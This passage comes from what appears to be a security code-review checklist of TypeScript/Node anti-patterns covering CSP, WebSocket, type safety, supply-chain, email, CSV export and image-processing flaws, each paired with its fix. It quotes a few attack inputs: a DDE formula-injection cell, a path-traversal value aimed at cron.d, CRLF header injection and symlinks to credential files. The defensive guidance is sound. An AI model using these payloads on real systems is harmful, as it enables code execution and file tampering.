- **CSP nonce predictable:** `Date.now() + Math.random()` — attacker predicts nonce, injects scripts that pass CSP. Must use `crypto.randomBytes(16).toString('base64')`.
- **CSP Report-Only in production:** Reports violations but never blocks — false sense of security. Flag `Content-Security-Policy-Report-Only` used without enforcing `Content-Security-Policy`.
- **CSP report endpoint public:** Anyone can POST fake violation reports — DoS via flood. Flag report endpoints without authentication.

### WebSocket Security (Express/ws)
- **No authentication on WebSocket upgrade:** `wss.handleUpgrade()` called without verifying JWT/session — anyone can connect. Flag every WS upgrade handler without auth check.
- **Token in URL query string:** `?token=xxx` for WS auth — appears in proxy logs, server logs, browser history. Must use `Sec-WebSocket-Protocol` header or cookie-based auth.
- **Origin header not validated:** Any website can open WebSocket to server — Cross-Site WebSocket Hijacking. Attacker's page at evil.com opens WS to victim's server using victim's cookies. Must validate Origin against allowlist.
- **No max connections limit:** Attacker opens thousands of WS connections exhausting file descriptors. Must set `maxConnections` and per-IP limits.
- **No heartbeat/ping timeout:** Client disconnects without TCP FIN — zombie connections accumulate forever, leaking memory and file descriptors. Must set `pingInterval` and terminate unresponsive clients.
- **No message size limit:** WebSocket frames can be up to 2^63-1 bytes — attacker sends multi-GB frame crashing server. Must cap at reasonable size (e.g., 1MB).
- **No message rate limiting:** One client floods server with thousands of messages/second — CPU/bandwidth DoS. Must enforce per-connection message rate limits.
- **No authorization check for room/channel access:** Any user joins any room (admin rooms, private DMs). Must verify room membership on join and each message.
- **Welcome message exposes internal state:** `totalClients`, `serverTime`, `uptime` sent to every new connection — information disclosure. Strip from welcome payload.
- **Internal commands exposed to clients:** `admin.stats`, `server.restart` type handlers accessible via WS messages from any client. Must restrict internal message types to authenticated/admin connections.
- **Chat messages echoed without sanitization:** User messages broadcast verbatim to all room members — stored XSS. HTML-escape all user content before broadcast.
- **User identity from client message:** `payload.from` trusted without server-side verification — spoofable. Always derive sender identity from authenticated session, never from the message payload.
- **No subprotocol negotiation validation:** Client claims any `Sec-WebSocket-Protocol` — no allowlist. Flag unvalidated subprotocol headers.
- **WebSocket on same port as HTTP:** WS DoS attack affects HTTP availability. Consider separate port or strict resource isolation.
- **ws:// accepted instead of requiring wss://:** Plaintext WebSocket — messages readable by any MITM. Must redirect ws:// to wss:// or reject.

### TypeScript Type Safety (Runtime Validation Gaps)
- **Unsafe `as` cast without runtime validation:** `JSON.parse(json) as User` — TypeScript trusts the cast but runtime doesn't validate. Attacker sends `{"id":"admin","email":true}`. Must validate with zod, io-ts, or manual checks before casting.
- **Generic `as T` cast on external input:** `parseBody<T>(body)` returns `body as T` — false sense of type safety. The generic parameter is erased at runtime. Must validate against schema.
- **parseInt without radix:** `parseInt(input)` — `'0x1A'` parsed as hex (26), `'012'` as octal (10 in legacy). Always use `parseInt(input, 10)`.
- **parseInt NaN not checked:** `parseInt('abc')` returns `NaN` — NaN propagates silently through calculations (NaN * 2 = NaN). Must check `Number.isNaN()` after parsing.
- **parseInt silently truncates floats:** `parseInt('3.14')` returns 3 — no error, data loss. Use `parseFloat` or `Number()` with explicit rounding for expected integer inputs.
- **Pagination negative/zero/unbounded:** `page = query.page || 1` without range check — negative page crashes DB, limit=0 returns nothing or everything, limit=999999999 exhausts memory. Must clamp `page >= 1`, `limit` between 1 and 100.
- **Incomplete HTML sanitization:** Only escaping `<` and `>` — attributes like `onerror`, `onload`, `javascript:` URLs still pass. Use DOMPurify or a vetted sanitization library, never hand-rolled regex.
- **Missing &amp; escaping:** `str.replace(/</g, '&lt;')` without also escaping `&` — ampersands in user input create ambiguous entities. Must escape `&` first: `str.replace(/&/g, '&amp;').replace(/</g, '&lt;')...`
- **Incomplete shell escaping:** Only escaping `$` and backtick — misses `;`, `&`, `|`, `<`, `>`, `(`, `)`, `{`, `}`, `!`, `#`, newline, space. Never hand-roll shell escaping; use `child_process.execFile` (no shell) or proper argument arrays.
- **Type guard with incomplete checks:** `return 'id' in value` as `value is User` — only checks property existence, not types. Email could be `true`, role could be `{}`. Must validate every required field and its type.
- **isValidEnum via Object.values():** `Object.values(MyEnum).includes(value)` — TypeScript numeric enums have reverse string mappings. `Object.values(Status)` returns `[0, 1, "ACTIVE", "INACTIVE"]` — string "ACTIVE" passes as valid when only 0/1 expected. Filter to numeric values only for numeric enums.
- **API key from query param checked FIRST:** `req.query.api_key || req.headers['x-api-key']` — query param appears in all server/proxy/browser logs. Must prefer Authorization header and reject query param keys entirely.
- **getEnv with hardcoded defaults:** `process.env.SECRET || 'my-secret-2024'` — secret baked into source in plaintext. Must throw if required env var is missing; defaults only for non-sensitive config.
- **Dynamic import in hot path:** `const { query } = await import('../db/connection.js')` in request handler — async I/O on every request, defeats tree-shaking. Use static imports at module top.

### Dependency / Supply Chain Security (TypeScript/Node)

- **Semver range treated as pinned:** `isVersionPinned('^1.0.0')` returning true — caret, tilde, `>=`, `<=`, `x`, `*`, `latest` are NOT pinned. They allow automatic minor/patch/major updates. True pinning means exact version: `1.2.3`. Flag any version pinning validator that accepts ranges.
- **Only top-level deps checked:** `Object.keys(package.dependencies)` — misses transitive dependencies entirely. Most vulnerabilities live in transitive deps. Must also scan `node_modules/.package-lock.json` or run `npm audit --all`.
- **No license field in dependency metadata:** Using packages without tracking their licenses — GPL/AGPL copyleft risk, unlicensed packages with unknown legal status. Must include `license` in dependency metadata and flag copyleft/unlicensed.
- **No deprecated flag in dependency metadata:** Using deprecated packages without warning — unmaintained, security-vulnerable. Must include `deprecated` field and escalate on deprecated usage.
- **Only postinstall scripts flagged:** Only checking `postinstall` — misses `preinstall`, `install`, `preuninstall`, `postuninstall` hooks. All lifecycle scripts in package.json can execute arbitrary code. Must check all script hooks.
- **Bin-linking without symlink target validation:** `checkBinLinking()` verifies bin entries exist but doesn't verify symlink targets stay within `node_modules` — malicious package can symlink to `/etc/passwd` or `~/.ssh`. Must resolve and validate symlink target paths.
- **Aggregation hides individual failures:** `results.every(r => r.ok)` aggregates to boolean — individual vulnerability details lost. Must preserve and report each finding separately.

### Enhanced Email Security (TypeScript/Node)

- **Hardcoded From address without DMARC alignment:** `from: 'noreply@company.com'` hardcoded — if the sending domain differs from the From domain, DMARC fails (SPF/DKIM not aligned). The email is spoofable or goes to spam. Must validate From address matches authenticated sending domain or use a subdomain with relaxed DMARC policy.
- **Missing List-Unsubscribe header:** Bulk/transactional emails without `List-Unsubscribe` header (RFC 8058) — Gmail and Yahoo require this for bulk senders (enforced Feb 2024). Missing header causes delivery failures or spam classification.
- **No one-click unsubscribe mechanism:** `List-Unsubscribe-Post: List-Unsubscribe=One-Click` not implemented — users must manually email or visit a page to unsubscribe. CAN-SPAM (US) requires functional unsubscribe; GDPR (EU) requires easy withdrawal of consent. Flag email services without automated unsubscribe endpoint.
- **Sequential batch sending without error isolation:** `for (const email of recipients) { await send(email); }` — if recipient N fails, recipients N+1 through end never receive the email. Must isolate each send in its own try/catch and track failures separately.

### CSV / Export Security (TypeScript/Node)

- **No CSV special character escaping:** `row.join(',')` without escaping commas, quotes, or newlines in cell values — injected commas break column alignment, newlines create fake rows. Must wrap fields containing special chars in double quotes and escape embedded double quotes by doubling them (`" → ""`).
- **CSV formula injection:** Cell values starting with `=`, `+`, `-`, `@` interpreted as formulas by Excel/LibreOffice. `=cmd|' /C calc'!A0` executes commands (DDE). Must prefix formula-trigger characters with `'` (single quote) to force text interpretation.
- **No UTF-8 BOM for Excel:** CSV without `\uFEFF` BOM prefix — Excel opens UTF-8 as Windows-1252, garbling CJK, accented, and special characters. Must prepend BOM for Excel-compatible CSV exports.
- **Export file path outside designated directory:** `writeFileSync(userPath, csv)` without validating the resolved path is within `EXPORT_DIR` — attacker sets `userPath = ../../../etc/cron.d/evil` to write arbitrary files. Must canonicalize and verify path prefix.
- **Content-Disposition header injection:** Filename from user input interpolated into `Content-Disposition: attachment; filename="${userName}.csv"` — attacker injects `\r\n` to add arbitrary HTTP headers. Must strip CRLF from filenames.

### Image Processing Security (TypeScript/Node — additions)

- **Magic byte verification bypass:** `file.name.endsWith('.jpg')` as sole file type check — attacker renames `malware.exe` to `profile.jpg`, extension passes. Must read first bytes of file and validate against known magic byte signatures (JPEG: FF D8 FF, PNG: 89 50 4E 47, etc.). Flag any file type validation based solely on extension.
- **ImageTragick (CVE-2016-3714):** ImageMagick's `convert`/`identify` with crafted images exploits delegate commands (MVG, SVG, EPS) — RCE via `https://` delegate, file read via `label:@` delegate. Must configure `policy.xml` to disable dangerous delegates or use a sandboxed alternative like sharp/vips.
- **Incomplete EXIF/metadata stripping:** `exiftool -all=` strips standard EXIF but misses XMP (Extensible Metadata Platform), IPTC (International Press Telecommunications Council), and ICC (color profile) embedded data — GPS coordinates, camera serial numbers, and thumbnail images survive. Must use `-all:all=` or a dedicated library that strips all metadata namespaces.

> **Extended TypeScript patterns:** See `references/ts-extended-security.md` for gRPC, BullMQ job queue, and Prometheus metrics anti-patterns (added Iteration 23).
> **Iteration 28 patterns:** See `references/iter28-new-patterns.md` for HTTP Client / RestTemplate SSRF, Logback/Log4j configuration vulnerabilities, and Spring Event/Messaging security — 3 new categories (60 planted issues).
